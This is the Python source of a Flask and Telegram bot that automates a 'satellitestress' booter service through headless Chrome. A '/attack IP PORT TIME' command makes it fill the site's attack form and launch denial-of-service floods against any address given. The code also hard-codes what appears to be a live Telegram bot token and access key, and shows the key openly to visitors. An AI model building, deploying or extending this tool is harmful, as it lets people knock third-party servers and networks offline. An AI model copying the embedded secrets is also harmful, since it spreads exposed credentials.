import os
import json
import time
import pickle
import threading
import re
import random
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from pyvirtualdisplay import Display
import logging
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import subprocess
import sys

# ==================== CONFIG ====================
TELEGRAM_BOT_TOKEN = "8739857934:AAFC8icETbmsxjYIqxcOmF8MHD_xg7xHZdo"
ACCESS_KEY = "2d1139b0c49e3019b0a54a5f6e60062957db4353b4daf6259b8a2752276d26b4"
LOGIN_URL = "https://satellitestress.st/login"
ATTACK_URL = "https://satellitestress.st/attack"
COOKIES_FILE = "cookies.pkl"
PORT = int(os.environ.get("PORT", 10000))  # Render expects port 10000

# ==================== CHROME PATHS for Render ====================
CHROME_PATHS = [
    '/usr/bin/google-chrome',
    '/usr/bin/google-chrome-stable',
    '/usr/bin/chromium-browser',
    '/usr/bin/chromium',
    '/app/.chrome-for-testing/chrome-linux64/chrome',
    '/opt/render/project/.chrome/chrome-linux64/chrome'
]

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ==================== CHROME INSTALLER for Render ====================
def install_chrome():
    """Install Chrome on Render"""
    try:
        logger.info("📦 Installing Chrome...")
        
        # Download Chrome
        subprocess.run([
            'wget', '-q', '-O', 'chrome.deb',
            'https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb'
        ], check=True)
        
        # Install Chrome
        subprocess.run([
            'dpkg', '-i', 'chrome.deb'
        ], check=False)  # Continue even if fails
        
        # Fix dependencies
        subprocess.run([
            'apt-get', 'install', '-f', '-y'
        ], check=True)
        
        # Remove deb file
        os.remove('chrome.deb')
        
        logger.info("✅ Chrome installed")
        return True
    except Exception as e:
        logger.error(f"Chrome install error: {e}")
        return False

# ==================== BROWSER MANAGER ====================
class BrowserManager:
    def __init__(self):
        self.driver = None
        self.display = None
        self.is_logged_in = False
        self.login_time = None
        
    def find_chrome(self):
        """Find Chrome executable path"""
        for path in CHROME_PATHS:
            if os.path.exists(path):
                return path
        return None
        
    def start(self):
        """Start browser with proper Chrome path"""
        try:
            logger.info("🚀 Starting browser...")
            
            # Find Chrome
            chrome_path = self.find_chrome()
            if not chrome_path:
                logger.warning("Chrome not found, installing...")
                install_chrome()
                chrome_path = self.find_chrome()
            
            logger.info(f"📌 Chrome path: {chrome_path}")
            
            # Virtual display
            self.display = Display(visible=0, size=(1920, 1080))
            self.display.start()
            
            # Chrome options
            options = Options()
            options.binary_location = chrome_path
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-gpu")
            options.add_argument("--headless=new")
            options.add_argument("--window-size=1920,1080")
            options.add_argument("--disable-blink-features=AutomationControlled")
            options.add_argument("--disable-web-security")
            options.add_argument("--allow-running-insecure-content")
            options.add_argument("--ignore-certificate-errors")
            options.add_argument("--disable-features=VizDisplayCompositor")
            
            # Start driver (without webdriver-manager)
            service = Service(executable_path="/usr/local/bin/chromedriver")
            self.driver = webdriver.Chrome(service=service, options=options)
            
            logger.info("✅ Browser started")
            
            # Load session
            if os.path.exists(COOKIES_FILE):
                self.load_session()
            
        except Exception as e:
            logger.error(f"Browser start error: {e}")
    
    def load_session(self):
        """Load saved cookies"""
        try:
            with open(COOKIES_FILE, 'rb') as f:
                cookies = pickle.load(f)
            
            self.driver.get(LOGIN_URL)
            time.sleep(3)
            
            for cookie in cookies:
                try:
                    self.driver.add_cookie(cookie)
                except:
                    pass
            
            logger.info("✅ Session loaded")
            self.check_login()
            
        except Exception as e:
            logger.error(f"Session load error: {e}")
    
    def save_session(self):
        """Save cookies"""
        try:
            cookies = self.driver.get_cookies()
            with open(COOKIES_FILE, 'wb') as f:
                pickle.dump(cookies, f)
            logger.info(f"✅ Saved {len(cookies)} cookies")
            return True
        except Exception as e:
            logger.error(f"Save error: {e}")
            return False
    
    def check_login(self):
        """Check if logged in"""
        try:
            self.driver.get(ATTACK_URL)
            time.sleep(3)
            
            if "attack" in self.driver.current_url or "dashboard" in self.driver.current_url:
                self.is_logged_in = True
                self.login_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                logger.info("✅ Logged in")
                return True
        except:
            pass
        
        self.is_logged_in = False
        return False
    
    def attack(self, ip, port, duration):
        """Launch attack"""
        try:
            self.driver.get(ATTACK_URL)
            time.sleep(3)
            
            WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.NAME, "ip")))
            
            ip_input = self.driver.find_element(By.NAME, "ip")
            ip_input.clear()
            ip_input.send_keys(ip)
            
            port_input = self.driver.find_element(By.NAME, "port")
            port_input.clear()
            port_input.send_keys(str(port))
            
            time_input = self.driver.find_element(By.NAME, "time")
            time_input.clear()
            time_input.send_keys(str(duration))
            
            submit_btn = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
            submit_btn.click()
            time.sleep(3)
            
            logger.info(f"✅ Attack sent")
            return True
            
        except Exception as e:
            logger.error(f"Attack error: {e}")
            return False

# ==================== TELEGRAM BOT ====================
class TelegramBot:
    def __init__(self, browser):
        self.browser = browser
        self.application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
        self.setup_handlers()
    
    def setup_handlers(self):
        self.application.add_handler(CommandHandler("start", self.start))
        self.application.add_handler(CommandHandler("help", self.help))
        self.application.add_handler(CommandHandler("status", self.status))
        self.application.add_handler(CommandHandler("attack", self.attack))
    
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            "🚀 **Satellite Stress Bot**\n\n"
            f"🌐 Web: https://udprocket-5.onrender.com\n\n"
            "**Commands:**\n"
            "/status - Check login\n"
            "/attack IP PORT TIME - Launch attack",
            parse_mode="Markdown"
        )
    
    async def help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            "📚 **Usage:**\n\n"
            "1. Open web interface\n"
            "2. Login in iframe\n"
            "3. Save session\n"
            "4. Use /attack\n\n"
            f"**Access Key:** `{ACCESS_KEY}`",
            parse_mode="Markdown"
        )
    
    async def status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        self.browser.check_login()
        text = f"📊 **Status:**\n\n"
        text += f"Login: {'✅' if self.browser.is_logged_in else '❌'}\n"
        text += f"Session: {'✅' if os.path.exists(COOKIES_FILE) else '❌'}"
        await update.message.reply_text(text, parse_mode="Markdown")
    
    async def attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.browser.is_logged_in:
            await update.message.reply_text("❌ Not logged in. Login via web first.")
            return
        
        if len(context.args) < 3:
            await update.message.reply_text("❌ Use: /attack IP PORT TIME")
            return
        
        ip, port, duration = context.args[0], context.args[1], context.args[2]
        
        await update.message.reply_text(f"🚀 Attacking {ip}:{port}...")
        
        success = await asyncio.get_event_loop().run_in_executor(
            None, self.browser.attack, ip, port, duration
        )
        
        if success:
            await update.message.reply_text("✅ Attack launched!")
        else:
            await update.message.reply_text("❌ Attack failed")
    
    def run(self):
        self.application.run_polling()

# ==================== HTML TEMPLATE ====================
HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Satellite Stress Bot</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f172a;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            width: 100%;
            background: white;
            border-radius: 24px;
            overflow: hidden;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
        }
        .header {
            background: linear-gradient(135deg, #2563eb, #7c3aed);
            color: white;
            padding: 20px;
            text-align: center;
        }
        .content { padding: 20px; }
        
        .status-bar {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .status-item {
            background: #f1f5f9;
            padding: 10px 15px;
            border-radius: 12px;
            flex: 1;
        }
        .status-label { color: #64748b; font-size: 12px; }
        .status-value { font-weight: 600; color: #0f172a; }
        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 11px;
            margin-left: 5px;
        }
        .badge-success { background: #22c55e; color: white; }
        .badge-warning { background: #eab308; color: white; }
        
        .key-box {
            background: #0f172a;
            color: #e2e8f0;
            padding: 15px;
            border-radius: 12px;
            font-family: monospace;
            word-break: break-all;
            margin: 20px 0;
            font-size: 14px;
        }
        
        .button-group {
            display: flex;
            gap: 10px;
            margin: 20px 0;
            flex-wrap: wrap;
        }
        .btn {
            padding: 12px 20px;
            border: none;
            border-radius: 12px;
            font-weight: 600;
            cursor: pointer;
            color: white;
            flex: 1;
        }
        .btn-primary { background: #2563eb; }
        .btn-success { background: #22c55e; }
        .btn-warning { background: #eab308; }
        
        .iframe-container {
            width: 100%;
            height: 600px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            overflow: hidden;
            margin: 20px 0;
            background: white;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        
        .telegram-link {
            display: block;
            text-align: center;
            padding: 15px;
            background: #1e293b;
            color: white;
            text-decoration: none;
            border-radius: 12px;
            margin: 20px 0;
        }
        
        .footer {
            text-align: center;
            padding: 15px;
            background: #f8fafc;
            color: #64748b;
            font-size: 12px;
        }
        
        .note-box {
            background: #fee2e2;
            border: 1px solid #ef4444;
            color: #991b1b;
            padding: 15px;
            border-radius: 12px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🐍 Satellite Stress Bot</h1>
        </div>
        
        <div class="content">
            <div class="note-box">
                <strong>⚠️ IMPORTANT:</strong><br>
                Website is blocking Render IP. Please use this VPN extension in Chrome:
                <br><br>
                <strong>1. Install this extension:</strong><br>
                <a href="https://chrome.google.com/webstore/detail/zenmate-free-vpn%E2%80%93best-vpn/fdcgdnkidjaadafnichfpabhfomcebme" target="_blank">ZenMate VPN</a><br>
                <a href="https://chrome.google.com/webstore/detail/hola-free-vpn-proxy-unblo/gkojfkhlekighikafcpjkiklfbnlmeio" target="_blank">Hola VPN</a>
                <br><br>
                <strong>2. Connect to any country (India/US/UK)</strong><br>
                <strong>3. Refresh this page</strong>
            </div>
            
            <div class="status-bar">
                <div class="status-item">
                    <div class="status-label">Login Status</div>
                    <div class="status-value">
                        <span id="loginText">{{ 'Logged In' if is_logged_in else 'Not Logged In' }}</span>
                        <span id="loginBadge" class="badge {{ 'badge-success' if is_logged_in else 'badge-warning' }}">
                            {{ 'ACTIVE' if is_logged_in else 'INACTIVE' }}
                        </span>
                    </div>
                </div>
                <div class="status-item">
                    <div class="status-label">Session</div>
                    <div class="status-value" id="sessionText">
                        {{ '✅ Saved' if session_exists else '❌ Not Saved' }}
                    </div>
                </div>
            </div>
            
            <div class="key-box">
                <strong>🔑 ACCESS KEY:</strong><br>
                {{ access_key }}
            </div>
            
            <div class="button-group">
                <button class="btn btn-primary" onclick="reloadIframe()">🔄 Reload Login Page</button>
                <button class="btn btn-success" onclick="saveSession()">💾 Save Session</button>
                <button class="btn btn-warning" onclick="checkStatus()">🔄 Refresh Status</button>
            </div>
            
            <div class="iframe-container">
                <iframe id="loginFrame" src="{{ login_url }}"></iframe>
            </div>
            
            <div style="background: #dbeafe; padding: 15px; border-radius: 12px; margin: 20px 0;">
                <strong>📝 LOGIN STEPS:</strong><br>
                1. Install VPN extension (Chrome Web Store) ⬆️<br>
                2. Connect to India/UK/US server<br>
                3. Refresh this page (Reload Login Page)<br>
                4. Login with Access Key<br>
                5. Click "Save Session"<br>
                6. Use Telegram bot
            </div>
            
            <a href="https://t.me/satellitestress_bot" class="telegram-link" target="_blank">
                📱 Open Telegram Bot
            </a>
        </div>
        
        <div class="footer">
            Port: {{ port }} | Render URL: {{ render_url }}
        </div>
    </div>
    
    <script>
        function reloadIframe() {
            document.getElementById('loginFrame').src = '{{ login_url }}';
        }
        
        async function saveSession() {
            const btn = event.target;
            btn.textContent = '💾 Saving...';
            btn.disabled = true;
            
            try {
                const res = await fetch('/save-session', {method: 'POST'});
                const data = await res.json();
                alert(data.success ? '✅ Session saved!' : '❌ ' + data.message);
            } catch (e) {
                alert('❌ Error: ' + e.message);
            } finally {
                btn.textContent = '💾 Save Session';
                btn.disabled = false;
                checkStatus();
            }
        }
        
        async function checkStatus() {
            const res = await fetch('/status');
            const data = await res.json();
            
            document.getElementById('loginText').textContent = data.is_logged_in ? 'Logged In' : 'Not Logged In';
            document.getElementById('loginBadge').textContent = data.is_logged_in ? 'ACTIVE' : 'INACTIVE';
            document.getElementById('loginBadge').className = 'badge ' + (data.is_logged_in ? 'badge-success' : 'badge-warning');
            document.getElementById('sessionText').textContent = data.session_exists ? '✅ Saved' : '❌ Not Saved';
        }
        
        setInterval(checkStatus, 5000);
    </script>
</body>
</html>
"""

# ==================== FLASK ROUTES ====================
browser = BrowserManager()

@app.route('/')
def index():
    return render_template_string(
        HTML,
        is_logged_in=browser.is_logged_in,
        session_exists=os.path.exists(COOKIES_FILE),
        access_key=ACCESS_KEY,
        login_url=LOGIN_URL,
        render_url="https://udprocket-5.onrender.com",
        port=PORT
    )

@app.route('/status')
def get_status():
    return jsonify({
        'is_logged_in': browser.is_logged_in,
        'session_exists': os.path.exists(COOKIES_FILE),
        'login_time': browser.login_time
    })

@app.route('/save-session', methods=['POST'])
def save_session():
    if browser.save_session():
        browser.check_login()
        return jsonify({'success': True})
    return jsonify({'success': False, 'message': 'No cookies found'})

# ==================== MAIN ====================
def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

def run_telegram():
    try:
        bot = TelegramBot(browser)
        bot.run()
    except Exception as e:
        logger.error(f"Telegram bot error: {e}")

if __name__ == '__main__':
    print("="*50)
    print("🚀 Starting Satellite Stress Bot")
    print(f"📌 Port: {PORT}")
    print("="*50)
    
    # Install Chrome if needed
    if not os.path.exists('/usr/bin/google-chrome-stable'):
        install_chrome()
    
    # Start browser
    browser.start()
    browser.check_login()
    
    # Start Flask
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    # Run Telegram
    run_telegram()
